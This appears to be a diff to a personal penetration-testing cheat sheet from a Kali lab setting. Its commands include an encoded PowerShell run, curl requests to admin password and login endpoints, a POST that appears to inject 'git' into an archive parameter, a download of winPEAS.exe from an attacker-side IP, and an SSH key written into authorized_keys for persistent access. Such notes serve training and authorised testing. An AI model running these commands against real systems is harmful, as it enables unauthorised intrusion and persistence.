@@ -173,6 +173,7 @@ $powershell -enc $EncodedText
 curl -i http://192.168.50.16:5002/users/v1/admin/password
 
 # POST Request
+curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
 curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
 
 # PUT Request
@@ -199,6 +200,21 @@ iwr -uri http://192.168.45.176:8000/winPEAS.exe -outfile c:/users/public/winPEAS
 #curl
 curl http://192.168.45.176/<FILE> > <OUTPUT_FILE>
 
+```
+
+# SSH
+## SSH KEYGEN
+```
+kali@kali:~$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in fileup
+Your public key has been saved in fileup.pub
+...
+
+kali@kali:~$ cat fileup.pub > authorized_keys
 ```
 
 
